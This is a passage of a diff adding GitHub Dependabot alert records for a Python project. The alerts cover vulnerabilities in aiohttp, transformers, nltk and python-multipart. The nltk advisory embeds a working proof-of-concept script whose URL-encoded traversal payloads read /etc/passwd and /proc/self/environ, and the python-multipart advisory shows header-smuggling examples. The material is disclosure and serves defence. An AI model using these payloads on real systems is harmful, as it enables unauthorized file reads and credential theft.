+        "url": "https://api.github.com/repos/fcas/danswerai/dependabot/alerts/275",
+        "html_url": "https://github.com/fcas/danswerai/security/dependabot/275",
+        "created_at": "2026-08-14T17:00:14Z",
+        "updated_at": "2026-08-16T01:17:08Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-16T01:17:08Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 270,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "aiohttp"
+            },
+            "manifest_path": "backend/requirements/default.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-cq5v-8q36-5273",
+            "cve_id": "CVE-2026-69244",
+            "summary": "AIOHTTP: Out-of-bounds heap read in C HTTP response parser error path (malformed chunked response)",
+            "description": "### Summary\n\nAn out-of-bounds heap read could occur in the C response parser while building an error message for a malformed response.\n\n### Impact\n\nAn attacker controlled server, or possibly an accidental response could trigger a DoS in the client.\n\n### Workaround\n\nIf unable to upgrade, the Python parser is unaffected and can be used with `AIOHTTP_NO_EXTENSIONS=1`.\n\n---\n\nPatch: https://github.com/aio-libs/aiohttp/commit/49f65d54150397892f7bcc4aae887767d51c322d",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-cq5v-8q36-5273",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-69244",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-cq5v-8q36-5273"
+                },
+                {
+                    "url": "https://github.com/aio-libs/aiohttp/pull/13223"
+                },
+                {
+                    "url": "https://github.com/aio-libs/aiohttp/commit/49f65d54150397892f7bcc4aae887767d51c322d"
+                },
+                {
+                    "url": "https://github.com/aio-libs/aiohttp/releases/tag/v3.14.3"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-cq5v-8q36-5273"
+                }
+            ],
+            "published_at": "2026-08-03T20:51:13Z",
+            "updated_at": "2026-08-03T20:51:15Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "aiohttp"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "<= 3.14.2",
+                    "first_patched_version": {
+                        "identifier": "3.14.3"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": null,
+                    "score": 0.0
+                },
+                "cvss_v4": {
+                    "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+                    "score": 7.1
+                }
+            },
+            "epss": {
+                "percentage": 0.003,
+                "percentile": 0.22567
+            },
+            "cvss": {
+                "vector_string": null,
+                "score": 0.0
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-125",
+                    "name": "Out-of-bounds Read"
+                },
+                {
+                    "cwe_id": "CWE-400",
+                    "name": "Uncontrolled Resource Consumption"
+                },
+                {
+                    "cwe_id": "CWE-416",
+                    "name": "Use After Free"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "aiohttp"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "<= 3.14.2",
+            "first_patched_version": {
+                "identifier": "3.14.3"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/danswerai/dependabot/alerts/270",
+        "html_url": "https://github.com/fcas/danswerai/security/dependabot/270",
+        "created_at": "2026-08-04T05:01:24Z",
+        "updated_at": "2026-08-04T05:01:24Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 269,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "aiohttp"
+            },
+            "manifest_path": "backend/requirements/default.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-mfx4-hv73-q22v",
+            "cve_id": "CVE-2026-69243",
+            "summary": "AIOHTTP: HTTP request smuggling via WebSocket upgrade",
+            "description": "### Summary\n\nThe HTTP parsers were vulnerable to a request smuggling attack relating to WebSocket upgrades.\n\n### Impact\n\nIf using the server-side component, it may be possible for an attacker to execute a request smuggling vulnerability using an edge case in the WebSocket upgrade procedure. AIOHTT is unaware of any public exploit code.\n\n---\n\nPatch: https://github.com/aio-libs/aiohttp/commit/6ae358f0983c3f4d6f67692b2f8e65dc8e091c98",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-mfx4-hv73-q22v",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-69243",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-mfx4-hv73-q22v"
+                },
+                {
+                    "url": "https://github.com/aio-libs/aiohttp/pull/13017"
+                },
+                {
+                    "url": "https://github.com/aio-libs/aiohttp/commit/6ae358f0983c3f4d6f67692b2f8e65dc8e091c98"
+                },
+                {
+                    "url": "https://github.com/aio-libs/aiohttp/releases/tag/v3.14.2"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-mfx4-hv73-q22v"
+                }
+            ],
+            "published_at": "2026-08-03T20:46:10Z",
+            "updated_at": "2026-08-03T20:47:09Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "aiohttp"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "<= 3.14.1",
+                    "first_patched_version": {
+                        "identifier": "3.14.2"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": null,
+                    "score": 0.0
+                },
+                "cvss_v4": {
+                    "vector_string": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+                    "score": 6.3
+                }
+            },
+            "epss": {
+                "percentage": 0.00275,
+                "percentile": 0.19676
+            },
+            "cvss": {
+                "vector_string": null,
+                "score": 0.0
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-444",
+                    "name": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "aiohttp"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "<= 3.14.1",
+            "first_patched_version": {
+                "identifier": "3.14.2"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/danswerai/dependabot/alerts/269",
+        "html_url": "https://github.com/fcas/danswerai/security/dependabot/269",
+        "created_at": "2026-08-04T04:42:32Z",
+        "updated_at": "2026-08-04T04:42:32Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 240,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "transformers"
+            },
+            "manifest_path": "backend/requirements/default.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-fgcw-684q-jj6r",
+            "cve_id": "CVE-2026-5241",
+            "summary": "huggingface/transformers: Arbitrary Code Execution During Model Initialization in the LightGlue Model Loading Path",
+            "description": "A vulnerability in the LightGlue model loading path of huggingface/transformers version 5.2.0 allows an attacker-controlled model repository to execute arbitrary code during model initialization. The issue arises because the `trust_remote_code` parameter, intended to prevent remote code execution, is overridden by untrusted serialized configuration data in a nested code path. Specifically, when loading a LightGlue model using `AutoModel.from_pretrained()` with `trust_remote_code=False`, the `LightGlueConfig` reads the `trust_remote_code` value from the untrusted `config.json` file and propagates it into nested `AutoConfig.from_pretrained()` calls. This results in the execution of attacker-provided Python modules, even when the victim explicitly disables remote code execution. The vulnerability poses a high risk for environments such as API inference servers, research notebooks, CI/CD pipelines, and model evaluation workers, potentially leading to credential theft, lateral movement, or persistence/backdoor deployment.",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-fgcw-684q-jj6r",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-5241",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-5241"
+                },
+                {
+                    "url": "https://github.com/huggingface/transformers/commit/676559d5022b74aaa0cee1cee0842b7f27c5320e"
+                },
+                {
+                    "url": "https://huntr.com/bounties/ceb3ce1a-4c45-497a-b25e-cb9a7685e619"
+                },
+                {
+                    "url": "https://access.redhat.com/security/cve/CVE-2026-5241"
+                },
+                {
+                    "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2484384"
+                },
+                {
+                    "url": "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-5241.json"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:34456"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:37275"
+                },
+                {
+                    "url": "https://github.com/pypa/advisory-database/tree/main/vulns/transformers/PYSEC-2026-2290.yaml"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:42644"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-fgcw-684q-jj6r"
+                }
+            ],
+            "published_at": "2026-06-03T15:30:43Z",
+            "updated_at": "2026-07-21T12:33:27Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "transformers"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 5.5.0",
+                    "first_patched_version": {
+                        "identifier": "5.5.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N",
+                    "score": 8.0
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00547,
+                "percentile": 0.42526
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N",
+                "score": 8.0
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-829",
+                    "name": "Inclusion of Functionality from Untrusted Control Sphere"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "transformers"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "< 5.5.0",
+            "first_patched_version": {
+                "identifier": "5.5.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/danswerai/dependabot/alerts/240",
+        "html_url": "https://github.com/fcas/danswerai/security/dependabot/240",
+        "created_at": "2026-07-13T18:44:40Z",
+        "updated_at": "2026-07-13T18:44:40Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 239,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "transformers"
+            },
+            "manifest_path": "backend/requirements/model_server.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-fgcw-684q-jj6r",
+            "cve_id": "CVE-2026-5241",
+            "summary": "huggingface/transformers: Arbitrary Code Execution During Model Initialization in the LightGlue Model Loading Path",
+            "description": "A vulnerability in the LightGlue model loading path of huggingface/transformers version 5.2.0 allows an attacker-controlled model repository to execute arbitrary code during model initialization. The issue arises because the `trust_remote_code` parameter, intended to prevent remote code execution, is overridden by untrusted serialized configuration data in a nested code path. Specifically, when loading a LightGlue model using `AutoModel.from_pretrained()` with `trust_remote_code=False`, the `LightGlueConfig` reads the `trust_remote_code` value from the untrusted `config.json` file and propagates it into nested `AutoConfig.from_pretrained()` calls. This results in the execution of attacker-provided Python modules, even when the victim explicitly disables remote code execution. The vulnerability poses a high risk for environments such as API inference servers, research notebooks, CI/CD pipelines, and model evaluation workers, potentially leading to credential theft, lateral movement, or persistence/backdoor deployment.",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-fgcw-684q-jj6r",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-5241",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-5241"
+                },
+                {
+                    "url": "https://github.com/huggingface/transformers/commit/676559d5022b74aaa0cee1cee0842b7f27c5320e"
+                },
+                {
+                    "url": "https://huntr.com/bounties/ceb3ce1a-4c45-497a-b25e-cb9a7685e619"
+                },
+                {
+                    "url": "https://access.redhat.com/security/cve/CVE-2026-5241"
+                },
+                {
+                    "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2484384"
+                },
+                {
+                    "url": "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-5241.json"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:34456"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:37275"
+                },
+                {
+                    "url": "https://github.com/pypa/advisory-database/tree/main/vulns/transformers/PYSEC-2026-2290.yaml"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:42644"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-fgcw-684q-jj6r"
+                }
+            ],
+            "published_at": "2026-06-03T15:30:43Z",
+            "updated_at": "2026-07-21T12:33:27Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "transformers"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 5.5.0",
+                    "first_patched_version": {
+                        "identifier": "5.5.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N",
+                    "score": 8.0
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00547,
+                "percentile": 0.42526
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N",
+                "score": 8.0
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-829",
+                    "name": "Inclusion of Functionality from Untrusted Control Sphere"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "transformers"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "< 5.5.0",
+            "first_patched_version": {
+                "identifier": "5.5.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/danswerai/dependabot/alerts/239",
+        "html_url": "https://github.com/fcas/danswerai/security/dependabot/239",
+        "created_at": "2026-07-13T18:44:40Z",
+        "updated_at": "2026-07-13T18:44:40Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 225,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "nltk"
+            },
+            "manifest_path": "backend/requirements/default.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-p4gq-832x-fm9v",
+            "cve_id": "CVE-2026-54293",
+            "summary": "Natural Language Toolkit (NLTK): URL-Encoded Path Traversal in nltk.data.load() Allows Arbitrary Local File Read",
+            "description": "### Summary\nnltk.data.load() in NLTK is vulnerable to path traversal via URL-encoded path separators and traversal segments when using the nltk: URL scheme. The unsafe-path regex check is performed before url2pathname() decodes the %xx sequences (a classic decode-after-check / TOCTOU-style flaw), allowing an attacker to bypass the protection documented in NLTK's SECURITY.md and read arbitrary files from the filesystem.\nWhile literal traversal strings such as ../../../etc/passwd are correctly blocked, encoded variants such as %2fetc%2fpasswd, %2e%2e%2f..., and ..%2f..%2f slip past the regex and are subsequently decoded into a real filesystem path.\n### Affected Component\nnltk/data.py — find(), normalize_resource_url(), and the _UNSAFE_NO_PROTOCOL_RE regex check.\nRelevant occurrences:\n\ndata.py L650–L653 — final path constructed from url2pathname(resource_name) after checks\ndata.py L54–L69 — _UNSAFE_NO_PROTOCOL_RE operates only on the undecoded string\ndata.py L219–L245 — normalize_resource_url() for nltk: scheme contributes to decode-after-check\ndata.py L615–L618 — defense-in-depth traversal check also operates on undecoded input\n\nRoot Cause\nThe regex _UNSAFE_NO_PROTOCOL_RE is matched against the raw resource string. Path normalization via url2pathname() happens later, so any percent-encoded / (%2f) or . (%2e) is invisible to the regex but becomes active in the final path.\n### Proof of Concept\n```\n\"\"\"\nNLTK Arbitrary File Read via URL-Encoded Path Traversal\n=======================================================\nBypasses _UNSAFE_NO_PROTOCOL_RE security regex in nltk/data.py\nby URL-encoding path separators and traversal components.\n\nAffected: NLTK <= 3.9.4 (default ENFORCE=False configuration)\nCWE: CWE-22 (Path Traversal)\n\nRoot Cause:\n  nltk/data.py:find() checks resource names against a regex for\n  traversal patterns (../, leading /, etc.) BEFORE calling\n  url2pathname() which decodes %xx sequences. This is a classic\n  \"decode-after-check\" vulnerability.\n\"\"\"\n\nimport sys\nimport os\nimport warnings\n\n# Suppress NLTK security warnings for clean PoC output\nwarnings.filterwarnings(\"ignore\", category=RuntimeWarning)\n\n# Setup\nsys.path.insert(0, os.path.join(os.path.dirname(__file__), \"nltk\"))\nos.makedirs(os.path.expanduser(\"~/nltk_data/corpora\"), exist_ok=True)\n\nimport nltk\nfrom nltk.pathsec import ENFORCE\n\nBANNER = \"\"\"\n===================================================\n NLTK URL-Encoded Path Traversal PoC\n Affected: nltk <= 3.9.4\n Default ENFORCE={enforce}\n===================================================\n\"\"\".format(enforce=ENFORCE)\n\ndef test_variant(name, payload, fmt=\"raw\"):\n    \"\"\"Test a single traversal variant.\"\"\"\n    try:\n        content = nltk.data.load(payload, format=fmt)\n        if isinstance(content, bytes):\n            preview = content[:200].decode(\"utf-8\", errors=\"replace\")\n        else:\n            preview = content[:200]\n        first_line = preview.split(\"\\n\")[0]\n        print(f\"  [VULN] {name}\")\n        print(f\"         Payload: {payload}\")\n        print(f\"         Read OK: {first_line}\")\n        return True\n    except Exception as e:\n        print(f\"  [SAFE] {name}\")\n        print(f\"         Payload: {payload}\")\n        print(f\"         Blocked: {type(e).__name__}: {e}\")\n        return False\n\n\ndef main():\n    print(BANNER)\n    vulns = 0\n\n    # --- Variant 1: URL-encoded absolute path ---\n    print(\"[1] URL-encoded absolute path (%2f = /)\")\n    if test_variant(\n        \"Encoded leading slash bypasses ^/ regex check\",\n        \"nltk:%2fetc%2fpasswd\",\n    ):\n        vulns += 1\n\n    print()\n\n    # --- Variant 2: Encoded dot-dot traversal ---\n    print(\"[2] URL-encoded dot-dot traversal (%2e = .)\")\n    if test_variant(\n        \"Encoded dots bypass \\\\.\\\\./ regex check\",\n        \"nltk:corpora/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\",\n    ):\n        vulns += 1\n\n    print()\n\n    # --- Variant 3: Literal dots with encoded slash ---\n    print(\"[3] Literal dots with encoded slash (..%2f)\")\n    if test_variant(\n        \"Encoded slash after literal .. bypasses \\\\.\\\\./ regex\",\n        \"nltk:corpora/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd\",\n    ):\n        vulns += 1\n\n    print()\n\n    # --- Variant 4: Read process environment (credential leak) ---\n    print(\"[4] Read /proc/self/environ (credential leakage)\")\n    try:\n        content = nltk.data.load(\"nltk:%2fproc%2fself%2fenviron\", format=\"raw\")\n        env_vars = content.decode(\"utf-8\", errors=\"replace\").split(\"\\x00\")\n        print(f\"  [VULN] Leaked {len(env_vars)} environment variables\")\n        for var in env_vars[:3]:\n            if var:\n                key = var.split(\"=\")[0] if \"=\" in var else var\n                print(f\"         {key}=...\")\n        vulns += 1\n    except Exception as e:\n        print(f\"  [SAFE] Blocked: {e}\")\n\n    print()\n\n    # --- Control: verify normal traversal IS blocked ---\n    print(\"[CONTROL] Verify literal ../ is blocked by regex\")\n    test_variant(\"Direct traversal (should be blocked)\", \"nltk:../../../etc/passwd\")\n\n    print()\n    print(\"=\" * 51)\n    print(f\" Result: {vulns} bypass variant(s) succeeded\")\n    if vulns > 0:\n        print(\" Status: VULNERABLE (url2pathname decodes after regex check)\")\n    else:\n        print(\" Status: Not vulnerable\")\n    print(\"=\" * 51)\n\n\nif __name__ == \"__main__\":\n    main()\n```\n### Impact\nArbitrary local file read whenever attacker-controlled input reaches nltk.data.load(). Realistic targets include:\n\n/etc/passwd, /etc/shadow (if readable)\n/proc/self/environ — leaks environment variables, often containing API keys, DB credentials, cloud secrets\nApplication source code and configuration files\nCloud metadata, deployment secrets, SSH keys\n\nThis is directly relevant to web applications, hosted notebook services, multi-tenant ML pipelines, and CI/CD systems that pass untrusted resource identifiers into NLTK. NLTK's SECURITY.md explicitly places path traversal within the scope of its protection model, so this is a documented security boundary being broken.\n\n### fix\nhttps://github.com/nltk/nltk/pull/3575",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-p4gq-832x-fm9v",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-54293",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/nltk/nltk/security/advisories/GHSA-p4gq-832x-fm9v"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-54293"
+                },
+                {
+                    "url": "https://github.com/nltk/nltk/pull/3575"
+                },
+                {
+                    "url": "https://access.redhat.com/security/cve/CVE-2026-54293"
+                },
+                {
+                    "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2491486"
+                },
+                {
+                    "url": "https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-2078.yaml"
+                },
+                {
+                    "url": "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-54293.json"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:42644"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-p4gq-832x-fm9v"
+                }
+            ],
+            "published_at": "2026-06-16T14:34:15Z",
+            "updated_at": "2026-07-21T12:33:34Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "nltk"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "<= 3.9.4",
+                    "first_patched_version": {
+                        "identifier": "3.10.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                    "score": 7.5
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00555,
+                "percentile": 0.43553
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                "score": 7.5
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-22",
+                    "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "nltk"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "<= 3.9.4",
+            "first_patched_version": {
+                "identifier": "3.10.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/danswerai/dependabot/alerts/225",
+        "html_url": "https://github.com/fcas/danswerai/security/dependabot/225",
+        "created_at": "2026-06-20T03:30:12Z",
+        "updated_at": "2026-06-20T03:30:12Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 217,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "python-multipart"
+            },
+            "manifest_path": "backend/requirements/default.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-vffw-93wf-4j4q",
+            "cve_id": "CVE-2026-53537",
+            "summary": "python-multipart: Content-Disposition parameter smuggling via RFC 2231/5987 extended parameters",
+            "description": "### Summary\n\n`parse_options_header` parsed `Content-Disposition` (and `Content-Type`) headers with [`email.message.Message`](https://docs.python.org/3/library/email.compat32-message.html#email.message.Message), which transparently applies [RFC 2231](https://datatracker.ietf.org/doc/html/rfc2231)/[5987](https://datatracker.ietf.org/doc/html/rfc5987) decoding. The extended parameter syntax (`filename*=charset'lang'value`, `name*=...`, and the `filename*0`/`filename*1` continuation form) is decoded and surfaced under the bare `filename`/`name` key, and overrides the plain parameter when both are present. [RFC 7578 §4.2](https://datatracker.ietf.org/doc/html/rfc7578#section-4.2) explicitly forbids the `filename*` form in `multipart/form-data`.\n\nComponents that follow RFC 7578, or that do not implement RFC 2231/5987 decoding for `multipart/form-data` (WAFs, proxies, gateways), may interpret such a header differently. An attacker can exploit that difference to smuggle a different field name or filename past an upstream inspector to the backend.\n\n### Details\n\nGiven both a plain and an extended parameter, the extended value won. For example:\n\n```\nContent-Disposition: form-data; name=\"comment\"; name*=utf-8''role\n```\n\nAn inspector following RFC 7578 sees the field `comment`, while the returned value was `name=role`. The same applies to filenames:\n\n```\nContent-Disposition: form-data; name=\"upload\"; filename=\"safe.txt\"; filename*=utf-8''evil.php\n```\n\nThe inspector sees `safe.txt`, while the returned value was `filename=evil.php`. Continuation parameters (`filename*0`, `filename*1`, and so on) were likewise reassembled into a `filename` invisible to a plain `filename=` match, and percent encoded sequences in the extended value were decoded (so `..%2F`, `%00`, and similar appeared in the returned filename).\n\nThis affects the high level `parse_options_header`, `FormParser`, `create_form_parser`, and `parse_form` APIs, and reaches Starlette/FastAPI through `request.form()`, where the smuggled value is exposed as the form field name or [`UploadFile.filename`](https://www.starlette.io/requests/#request-files).\n\n### Impact\n\nThis is an interpretation conflict ([CWE-436](https://cwe.mitre.org/data/definitions/436.html)) with other `multipart/form-data` parsers. An attacker able to submit `multipart/form-data` can present a different field name or filename to an upstream body inspecting component than the one delivered to the application. Concrete consequences depend on how the application uses these values, and may include bypassing a field name or filename based access/upload control, or, for an application that builds filesystem paths from the parsed filename without sanitization, path traversal via decoded `..%2F` sequences. Decoded control bytes such as `%00` can likewise cause confusion between an upstream validator and the backend. The `File` class applies `os.path.basename`, so file writing through it is not directly affected.\n\n### Mitigation\n\nUpgrade to `python-multipart` `0.0.30` or later, which ignores RFC 2231/5987 extended parameters (`name*`, `filename*`, and their continuations) so the plain `name`/`filename` parameter remains authoritative. RFC 7578 §4.2 forbids `filename*` for `multipart/form-data`; `name*` and the continuation forms are dropped for the same reason, since they are not valid `multipart/form-data` parameters either.",
+            "severity": "low",
+            "identifiers": [
+                {
+                    "value": "GHSA-vffw-93wf-4j4q",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-53537",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/Kludex/python-multipart/security/advisories/GHSA-vffw-93wf-4j4q"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-53537"
+                },
+                {
+                    "url": "https://github.com/Kludex/python-multipart"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-vffw-93wf-4j4q"
+                },
+                {
+                    "url": "https://github.com/pypa/advisory-database/blob/main/vulns/python-multipart/PYSEC-2026-3041.yaml"
+                },
+                {
+                    "url": "https://pypi.org/project/python-multipart"
+                }
+            ],
+            "published_at": "2026-06-15T20:20:51Z",
+            "updated_at": "2026-07-15T22:06:53Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "python-multipart"
+                    },
+                    "severity": "low",
+                    "vulnerable_version_range": "< 0.0.30",
+                    "first_patched_version": {
+                        "identifier": "0.0.30"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                    "score": 3.7
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00177,
+                "percentile": 0.07491
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                "score": 3.7
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-20",
+                    "name": "Improper Input Validation"
+                },
+                {
+                    "cwe_id": "CWE-436",
+                    "name": "Interpretation Conflict"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "python-multipart"
+            },
+            "severity": "low",
+            "vulnerable_version_range": "< 0.0.30",
+            "first_patched_version": {
+                "identifier": "0.0.30"
+            }
+        },
